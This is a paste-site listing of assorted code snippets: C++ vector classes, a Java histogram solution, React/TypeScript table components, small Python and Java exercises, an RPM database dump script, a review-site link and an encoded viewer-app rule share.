id,title,username,language,date,content
vgGiaanf,Untitled,35657,C++,Tuesday 12th of March 2024 07:20:25 AM CDT,"#include <iostream>


using namespace std;

class Vector {

public:
	Vector() : size_(0), capacity_(4), arr_(new int[4]) {}

	explicit Vector(const int vector_capacity) : size_(0), capacity_(vector_capacity), arr_(new int[vector_capacity]) {}

	Vector(const Vector& other) : size_(other.size_), capacity_(other.capacity_), arr_(new int[capacity_]) {
		for (int i = 0; i < size_; i++) {
			arr_[i] = other.arr_[i];
		}
		total_number_elements_ += size_;
	} // конструктор копирования

	Vector& operator=(const Vector& other) {
		if (&other != this) { // проверка на самоприсваивание
			total_number_elements_ += other.size_ - size_; // общее количество увеличивается (уменьшается) на разность элементов
			size_ = other.size_;
			capacity_ = other.capacity_;
			delete[] arr_;
			arr_ = new int[capacity_];
			for (int i = 0; i < size_; i++) {
				arr_[i] = other.arr_[i];
			}
		}
		return *this;
	} // копирующий оператор присваивания =
	
	Vector(Vector&& other) : size_(other.size_), capacity_(other.capacity_), arr_(other.arr_) {
		other.arr_ = nullptr;
		other.size_ = 0;
		other.capacity_ = 0;
	} // конструктор перемещения

	Vector& operator=(Vector&& other) {
		if (&other != this) {
			total_number_elements_ += other.size_ - size_; // общее количество увеличивается (уменьшается) на разность элементов
			size_ = other.size_;
			capacity_ = other.capacity_;
			delete[] arr_;
			arr_ = other.arr_;
			other.arr_ = nullptr;
			other.size_ = 0;
			other.capacity_ = 0;
		}
		return *this;
	} // перемещающий оператор присваивания =

	void push_back(const int value) {
		check_capacity();
		arr_[size_] = value;
		size_++;
		total_number_elements_++;
	}

	void pop_back() {
		if (size_ > 0) {
			size_--;
		}
		total_number_elements_--;
	}

	void insert(const int index, const int value) {
		if (index < 0 || index > size_) {
			cout << ""Некорректный индекс"" << endl;
			return;
		}
		check_capacity();
		for (int i = size_; i > index; i--) {
			arr_[i] = arr_[i - 1];
		}
		arr_[index] = value;
		size_++;
		total_number_elements_++;
	}

	void erase(const int index) {
		if (index < 0 || index >= size_) {
			cout << ""Некорректный индекс"" << endl;
			return;
		}
		for (int i = index; i < size_ - 1; i++) {
			arr_[i] = arr_[i + 1];
		}
		size_--;
		total_number_elements_--;
	}

	int& operator[](const int index) {
		if (index < 0 || index >= size_) {
			cout << ""Некорректный индекс"" << endl;
		}
		return arr_[index];
	}

	int operator[](const int index) const {
		if (index < 0 || index >= size_) {
			cout << ""Некорректный индекс"" << endl;
		}
		return arr_[index];
	}

	int size() const {
		return size_;
	}

	int capacity() const {
		return capacity_;
	}

	bool operator==(const Vector& right) const {
		if (right.size_ != size_) {
			return false;
		}
		for (int i = 0; i < size_; i++) {
			if (arr_[i] != right.arr_[i])
				return false;
		}
		return true;
	}

	bool operator!=(const Vector& right) const {
		return !(*this == right);
	}

	void print() const {
		for (int i = 0; i < size_; i++) {
			cout << arr_[i] << "" "";
		}
		cout << endl;
	}

	static int get_total_number_elements() {
		return total_number_elements_;
	}


	~Vector() {
		delete[] arr_;
		total_number_elements_ -= size_;
	}

private:

	void check_capacity() {
		if (size_ == capacity_) {
			int* temp = new int[capacity_ * 2];
			for (int i = 0; i < size_; i++) {
				temp[i] = arr_[i];
			}
			delete[] arr_;
			arr_ = temp;
			capacity_ *= 2;
		}
	}

	int size_; // текущее количество элементов
	int capacity_; // емкость хранилища
	int* arr_; // хранилище
	static int total_number_elements_; // общее количество элементов по всем векторам
};


int Vector::total_number_elements_ = 0;


int main() {
	setlocale(LC_ALL, ""ru"");

	Vector vec1;

	vec1.push_back(10);
	vec1.push_back(15);
	vec1.push_back(20);
	vec1.push_back(25);
	vec1.push_back(22);

	vec1.print();

	vec1.pop_back();
	vec1.print();

	vec1.insert(2, 44);
	vec1.print();

	vec1.erase(2);
	vec1.print();

	vec1[0] =  33;
	cout << vec1[3] << endl;

	vec1.print();

	cout << vec1.size() << endl;
	cout << vec1.capacity() << endl;

	cout << Vector::get_total_number_elements() << endl;

	const Vector vec2(vec1);

	vec2.print();

	cout << vec2.size() << endl;
	cout << vec2.capacity() << endl;

	Vector vec3;
	vec3 = vec1;

	cout << Vector::get_total_number_elements() << endl;

	cout << (vec1 == vec2) << endl;
	cout << (vec1 != vec2) << endl;
}
"
4vZ7sqNU,Untitled,mantha_raghava,Java,Tuesday 12th of March 2024 07:18:50 AM CDT,"import java.io.*;
import java.util.*;

public class Main {

    static int[] nearestSmallerOnLeft(int[] a, int n) {
        int[] left = new int[n];
        Stack<Integer> stack = new Stack<>();

        for (int i = 0; i < n; i++) {
            while (!stack.isEmpty() && a[i] <= a[stack.peek()]) {
                stack.pop();
            }
            left[i] = stack.isEmpty() ? -1 : stack.peek();
            stack.push(i);
        }

        return left;
    }

    static int[] nearestSmallerOnRight(int[] a, int n) {
        int[] right = new int[n];
        Stack<Integer> stack = new Stack<>();

        for (int i = n - 1; i >= 0; i--) {
            while (!stack.isEmpty() && a[i] <= a[stack.peek()]) {
                stack.pop();
            }
            right[i] = stack.isEmpty() ? -1 : stack.peek();
            stack.push(i);
        }

        return right;
    }

    static int areahistogram(int a[], int n) {
        int[] r = nearestSmallerOnRight(a, n);
        int[] l = nearestSmallerOnLeft(a, n);

        int ans = 0;
        for (int i = 0; i < n; i++) {
            ans = Math.max(ans, (r[i] - l[i] - 1) * a[i]);
        }

        return ans;
    }

    public static void main(String[] args) {
        Scanner s = new Scanner(System.in);
        int t = s.nextInt();

        while (t-- > 0) {
            int n = s.nextInt();
            int a[] = new int[n];

            for (int i = 0; i < n; i++) {
                a[i] = s.nextInt();
            }

            System.out.println(areahistogram(a, n));
        }
    }
}
"
D9ujazVq,src/app/packages/columns.tsx,TIMAS_Bro,TypeScript,Tuesday 12th of March 2024 07:08:44 AM CDT,"""use client""

import { ColumnDef } from ""@tanstack/react-table""
import { MoreHorizontal } from ""lucide-react""
import axios from ""axios"";
import { AxiosError } from 'axios'; // Import AxiosError type
import { Button } from ""@/components/ui/button""
import SnackbarContent from '@mui/material/SnackbarContent';
import React, { useState } from 'react';
import { useRouter } from ""next/navigation"";
import toast, { Toaster } from 'react-hot-toast';
import Action from ""../../hooks/ActionAllPackages"";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuLabel,
  DropdownMenuSeparator,
  DropdownMenuTrigger,
} from ""@/components/ui/dropdown-menu""

// This type is used to define the shape of our data.
// You can use a Zod schema here if you want.
export type Payment = {
  id: string
  name: string
}


export const columns: ColumnDef<Payment>[] = [
  {
    accessorKey: ""id"",
    header: ""Package ID"",
  },
  {
    accessorKey: ""name"",
    header: ""Package name"",
  },
  {
    id: ""actions"",
    header: ""Actions"",
    cell: ({ row }) => {
      const paket = row.original
      return (
        <Action paket={paket} />
      )
    },
  },
]
"
ZiTBpUhg,src/hooks/ActionAllPackages.tsx,TIMAS_Bro,TypeScript,Tuesday 12th of March 2024 07:08:13 AM CDT,"


import { ColumnDef } from ""@tanstack/react-table""
import { MoreHorizontal } from ""lucide-react""
import axios from ""axios"";
import { AxiosError } from 'axios'; // Import AxiosError type
import { Button } from ""@/components/ui/button""
import Snackbar from '@mui/material/Snackbar';
import Alert from '@mui/material/Alert';
import SnackbarContent from '@mui/material/SnackbarContent';
import React, { useState } from 'react';
import { useRouter } from ""next/navigation"";
import toast, { Toaster } from 'react-hot-toast';
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuLabel,
  DropdownMenuSeparator,
  DropdownMenuTrigger,
} from ""@/components/ui/dropdown-menu""

const ActionAllPackages = (paket) => {
  const router = useRouter();
  const handleCloseSnackbar = () => {
  const handleCopyPackagaName = (dependency) => {
    navigator.clipboard.writeText(dependency)
      .then(() => {
        toast.success(""Copied package name!"")
      })
      .catch(error => {
        toast.error(""Failed to copy the package name..."")
      });
  }

  const copyLink = () => {
    const selectedPackage = paket;

    // Return a new Promise
    return new Promise((resolve, reject) => {
      setTimeout(() => {
        navigator.clipboard.writeText(paket.link)
          .then(() => {
            // Resolve the promise if copying is successful
            resolve(paket.link);
          })
          .catch(error => {
            // Reject the promise if copying fails
            console.log(""COPY-ERROR: "", error);
            reject(error);
          });
      }, 1000);

    });
  };
  const handleCopyInstallLink = (e) => {
      const copyPromise = copyLink();
      toast.promise(
        copyPromise,
       {
         loading: 'Copying...',
         success: <b>Copied the install link!</b>,
         error: <b>Could not copy the install link!</b>,
       }
     );
  };
  const handleDetailedView = () => {
    router.push(`/detailed_view?name=${paket.name}`);
  };
  return (
    <div>
    <Toaster position=""bottom-right"" reverseOrder={false} />
    <DropdownMenu>
      <DropdownMenuTrigger asChild>
        <Button variant=""ghost"" className=""h-8 w-8 p-0"">
          <span className=""sr-only"">Open menu</span>
          <MoreHorizontal className=""h-4 w-4"" />
        </Button>
      </DropdownMenuTrigger>
      <DropdownMenuContent align=""end"">
        <DropdownMenuLabel>Actions</DropdownMenuLabel>
        <DropdownMenuItem
          onClick={() => handleCopyPackagaName(paket.name)}
        >
          Copy package name
        </DropdownMenuItem>
        <DropdownMenuItem
          onClick={handleCopyInstallLink}
        >
          Copy install link
        </DropdownMenuItem>
        <DropdownMenuSeparator />
        <DropdownMenuItem
          onClick={handleDetailedView}
        >
          Detailed view
        </DropdownMenuItem>
      </DropdownMenuContent>
    </DropdownMenu>
    </div>
  )
}

export default ActionAllPackages;
"
eK9fS9Tc,Untitled,paganoantonio,Java,Tuesday 12th of March 2024 06:34:09 AM CDT,"
import java.util.Scanner;

public class Test {

	public static void main(String[] args) {
			Scanner s = new Scanner(System.in);
			System.out.println(""inserisci 0 per calcolare l'area del triangolo"");
			System.out.println(""inserisci 1 per calcolare l'area di un quadrato"");	
			int r = s.nextInt();
			if (r == 0)
			{// area triangolo
				System.out.println(""inserisci la base"");
				int b = s.nextInt();
				System.out.println(""inserisci l'altezza"");
				int h = s.nextInt();
				int area = b*h/2;
				System.out.println(""l'area è:""+area);
			}
			if (r == 1)
			{// area quadrato
				System.out.println(""inserisci il lato"");
				int l = s.nextInt();
				int area = l*l;
				System.out.println(""l'area è:""+area);
			}
	}
}"
6z15gdUW,Review WesternFX,reviewbrokers,PHP,Tuesday 12th of March 2024 06:27:46 AM CDT,https://www.reviewbrokers.net/review-westernfx/
tB0z3prg,23401,boyan1324,Python,Tuesday 12th of March 2024 06:23:48 AM CDT,"my_list = [74, 154, 74, 90, 946, 995, 745, 549, 649, 522, 397, 129, 741, 299, 230]
middle_of_list = len(my_list) // 2
print(my_list)
my_list_copy = my_list.copy()
my_list_copy.reverse()
my_list.extend(my_list)
print(my_list)
print(sorted(my_list))
my_list.append(max(my_list))
my_list.sort(reverse=True)
print(my_list)
my_list.insert(middle_of_list, sum(my_list))
print(my_list)
my_list.insert(0, min(my_list))
print(my_list)
for i in my_list:
    if i % 10 == 8:
        my_list.remove(i)
        break
print(my_list)
my_list.insert(0, max(my_list))
print(my_list)
for j in my_list:
    if j % 10 == 7:
        my_list.insert(3, j)
        break
print(my_list)
"
GzAcUj05,Untitled,buonaseva_fatelo,Python,Tuesday 12th of March 2024 06:19:59 AM CDT,"'''#
# for sqlite databases
#

import json
import rpm
import tarfile

dbpath = ""/home/ubuntu-wbox-internal/Desktop/activity8/almalinux_db/var/lib/rpm""
#dbtype =   ""sqlite""
print(""ok"")


# database extraction
#tarfile = tarfile.open(""almalinux.tar"")
#tarfile.extractall(dbpath)
#tarfile.close()


#rpm.addMacro(""_db_backend"", dbtype)
rpm.addMacro(""_dbpath"", dbpath)
print(""ok"")

ts = rpm.TransactionSet()
ts.openDB()

#rpm.delMacro(""_db_backend"")
rpm.delMacro(""_dbpath"")

allPackages = []
mi = ts.dbMatch()
#mi.pattern(""name"", rpm.RPMMIRE_GLOB, ""kernel*"")
print(f""mi = {mi}"")

for hdr in mi:
    # second method
    pkg = {}
    pkg['name'] = hdr[rpm.RPMTAG_NAME]
    pkg['version'] = str(hdr[rpm.RPMTAG_VERSION])
    pkg['size'] = str(hdr[rpm.RPMTAG_SIZE])
    pkg['license'] = hdr[rpm.RPMTAG_LICENSE]
    pkg['arch'] = hdr[rpm.RPMTAG_ARCH]
    pkg['group'] = hdr[rpm.RPMTAG_GROUP]
    pkg['provides'] = hdr[rpm.RPMTAG_PROVIDES]
    pkg['dependencies'] = hdr[rpm.RPMTAG_REQUIRES]

    allPackages.append(pkg)

with open(""out_rpm.json"", ""w"") as fileout:
    print(json.dump(allPackages, fileout))

# ts.closeDB()
'''

#
# for sqlite databases
#

import json
import rpm
import tarfile

dbpath = ""/home/ubuntu-wbox-internal/Desktop/activity8/var/lib/rpm""
dbtype = ""ndb""
print(""ok"")

# database extraction
# tarfile = tarfile.open(""almalinux.tar"")
# tarfile.extractall(dbpath)
# tarfile.close()


rpm.addMacro(""_db_backend"", dbtype)
rpm.addMacro(""_dbpath"", dbpath)
print(""ok"")

ts = rpm.TransactionSet()
ts.openDB()

rpm.delMacro(""_db_backend"")
rpm.delMacro(""_dbpath"")

allPackages = []
mi = ts.dbMatch()
# mi.pattern(""name"", rpm.RPMMIRE_GLOB, ""kernel*"")
print(f""mi = {mi}"")

for hdr in mi:
    # second method
    pkg = {}
    pkg['name'] = hdr[rpm.RPMTAG_NAME]
    pkg['version'] = str(hdr[rpm.RPMTAG_VERSION])
    pkg['size'] = str(hdr[rpm.RPMTAG_SIZE])
    pkg['license'] = hdr[rpm.RPMTAG_LICENSE]
    pkg['arch'] = hdr[rpm.RPMTAG_ARCH]
    pkg['group'] = hdr[rpm.RPMTAG_GROUP]
    pkg['provides'] = hdr[rpm.RPMTAG_PROVIDES]
    pkg['dependencies'] = hdr[rpm.RPMTAG_REQUIRES]

    allPackages.append(pkg)

with open(""out_rpm.json"", ""w"") as fileout:
    print(json.dump(allPackages, fileout))

# ts.closeD"
aTX7aLcf,Untitled,35657,C++,Tuesday 12th of March 2024 06:19:29 AM CDT,"
#include <iostream>
#include <string>

using namespace std;

template<typename T>
class SimpleVector {

public:

	SimpleVector() : arr_(new T[10]), size_(10) {}

	SimpleVector(int size) : arr_(new T[size]), size_(size) {}

	SimpleVector(const SimpleVector& object) : arr_(new T[object.size_] {}), size_(object.size_) {
		for (int i = 0; i < size_; i++) {
			arr_[i] = object.arr_[i];
		};
	}

	SimpleVector& operator=(const SimpleVector& object) {
		if (!(this == &object)) {
			delete[] arr_;
			arr_ = new T[object.size_];
			size_ = object.size_;
			for (int i = 0; i < size_; i++) {
				arr_[i] = object.arr_[i];
			}
		}
		return *this;
	}

	SimpleVector(SimpleVector&& object) : arr_(object.arr_), size_(object.size_) {
		object.arr_ = nullptr;
		object.size_ = 0;
	}

	SimpleVector& operator=(SimpleVector&& object) {
		if (!(this == &object)) {
			delete[] arr_;
			arr_ = object.arr_;
			size_ = object.size_;
			object.arr_ = nullptr;
			object.size_ = 0;
		}
		return *this;
	}

	T& operator[] (int index) {
		if (index >= 0 && index < size_) {
			return arr_[index];
		}
	}

	T operator[] (int index) const {
		if (index >= 0 && index < size_) {
			return arr_[index];
		}
	}

	int Size() const {
		return size_;
	}

	~SimpleVector() {
		delete[] arr_;
	}

private:
	T* arr_;
	int size_;
};

template<typename T>
void print(const SimpleVector<T>& vec) {
	for (int i = 0; i < vec.Size(); i++) {
		cout << vec[i] << "" "";
	}
	cout << endl;
}

template<typename T>
void sort(SimpleVector<T>& vec) {
	for (int i = 0; i < vec.Size(); i++) {
		for (int j = 0; j < vec.Size() - 1; j++) {
			if (vec[j] > vec[j + 1]) {
				T temp = vec[j];
				vec[j] = vec[j + 1];
				vec[j + 1] = temp;
			}
		}
	}
}

int main() {
	SimpleVector<int> vec;
	for (int i = 0; i < vec.Size(); i++) {
		vec[i] = rand() % 10;
	}
	for (int i = 0; i < vec.Size(); i++) {
		cout << vec[i] << "" "";
	}
	cout << endl;

	SimpleVector<int> IntVector;
	for (int i = 0; i < IntVector.Size(); i++) {
		IntVector[i] = rand() % 10;
	}
	cout << ""IntVector:"" << endl;
	print(IntVector);
	cout << endl;
	cout << ""Sorted IntVector:"" << endl;
	sort(IntVector);
	print(IntVector);
	cout << endl;

	SimpleVector<string> StringVector;
	StringVector[0] = ""two"";
	StringVector[1] = ""seven"";
	StringVector[2] = ""zero"";
	StringVector[3] = ""four"";
	StringVector[4] = ""one"";
	StringVector[5] = ""three"";
	StringVector[6] = ""five"";
	StringVector[7] = ""six"";
	StringVector[8] = ""eight"";
	StringVector[9] = ""nine"";
	cout << ""StringVector:"" << endl;
	print(StringVector);
	cout << endl;
	cout << ""Sorted StringVector:"" << endl;
	sort(StringVector);
	print(StringVector);
	cout << endl;
}"
wcYGjNCH,邀您一起看：2024年2月推荐,xiaomianao666,JavaScript,Tuesday 12th of March 2024 06:13:38 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥2024年2月推荐@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbXSxcInNhdmVkXCI6ZmFsc2UsXCJ0aXRsZVwiOlwi5aWH5aaZ5bel5YW3566xXCIsXCJ2ZXJzaW9uXCI6MCxcInVybFwiOlwiaGlrZXI6Ly9lbXB0eVwiLFwiY29sX3R5cGVcIjpcIng1X3dlYnZpZXdfc2luZ2xlXCIsXCJmaW5kX3J1bGVcIjpcImpzOnNldFJlc3VsdChbe1xcbiAgICB1cmw6XFxcImh0dHBzOi8vaGFpa3Vvc2hpamllLmNuL2FyY2hpdmVzLzIwMjRuaWFuLTJ5dWUtdHVpLWppYW5cXFwiLFxcbmRlc2M6XFxcIjEwMCUmJmZsb2F0XFxcIixcXG5leHRyYTp7Y2FuQmFjazogdHJ1ZX1cXG59XSk7XCIsXCJncm91cFwiOlwi4pGg5o6o6I2QXCIsXCJwYWdlc1wiOlwiW11cIn0iLCJ0aXRsZSI6IjIwMjTlubQy5pyI5o6o6I2QIn0=
